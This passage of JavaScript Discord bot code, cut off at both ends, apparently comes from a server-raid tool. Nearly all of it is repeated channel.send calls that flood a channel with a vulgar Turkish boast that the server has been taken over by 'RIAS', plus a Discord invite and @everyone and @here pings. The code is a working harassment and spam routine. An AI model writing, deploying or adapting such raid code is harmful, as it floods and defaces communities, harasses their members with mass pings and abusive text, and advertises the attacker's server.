      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
          );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
